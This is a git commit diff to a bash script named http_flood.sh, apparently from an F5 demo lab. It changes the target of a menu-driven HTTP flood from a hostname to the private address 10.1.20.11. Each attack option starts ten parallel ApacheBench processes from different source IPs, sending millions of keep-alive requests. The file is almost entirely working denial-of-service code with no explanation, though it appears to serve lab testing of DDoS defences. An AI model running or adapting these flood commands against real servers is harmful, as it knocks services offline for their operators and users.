446843acdc9226aa638bb4184763f04914c3962c
ehc-io <eduardo@ehc.io>
2018-08-13 17:49:26 -0400

    minor fixes

--- http_flood.sh
+++ http_flood.sh
@@ -1,22 +1,22 @@
 #!/bin/bash
 
 PS5='Please enter your choice: '
-options=("Attack server1.f5demo.com" "Small Flood" "Attack End" "Quit")
+options=("Attack Auction" "Small Flood" "Attack End" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
         "Attack Auction")
             echo "Start attack"
-            ab -B 10.1.17.221 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://server1.f5demo.com/ &
-            ab -B 10.1.17.222 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://server1.f5demo.com/ &
-            ab -B 10.1.17.223 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://server1.f5demo.com/ &
-            ab -B 10.1.17.224 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://server1.f5demo.com/ &
-            ab -B 10.1.17.225 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://server1.f5demo.com/ &
-            ab -B 10.1.17.226 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://server1.f5demo.com/ &
-            ab -B 10.1.17.227 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://server1.f5demo.com/ &
-            ab -B 10.1.17.228 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://server1.f5demo.com/ &
-            ab -B 10.1.17.229 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://server1.f5demo.com/ &
-            ab -B 10.1.17.220 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://server1.f5demo.com/ &
+            ab -B 10.1.17.221 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.17.222 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.17.223 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.17.224 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.17.225 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.17.226 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.17.227 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.17.228 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.17.229 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.17.220 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
             ;;
         "Attack End")
             echo "Terminate attack"
@@ -25,16 +25,16 @@ do
             ;;
         "Small Flood")
             echo "Start attack"
-            ab -B 10.1.17.221 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://server1.f5demo.com/ &
-            ab -B 10.1.17.222 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://server1.f5demo.com/ &
-            ab -B 10.1.17.223 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://server1.f5demo.com/ &
-            ab -B 10.1.17.224 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://server1.f5demo.com/ &
-            ab -B 10.1.17.225 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://server1.f5demo.com/ &
-            ab -B 10.1.17.226 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://server1.f5demo.com/ &
-            ab -B 10.1.17.227 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://server1.f5demo.com/ &
-            ab -B 10.1.17.228 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://server1.f5demo.com/ &
-            ab -B 10.1.17.229 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://server1.f5demo.com/ &
-            ab -B 10.1.17.220 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://server1.f5demo.com/ &
+            ab -B 10.1.17.221 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.17.222 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.17.223 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.17.224 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.17.225 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.17.226 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.17.227 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.17.228 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.17.229 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.17.220 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
             ;;
 
         "Quit")
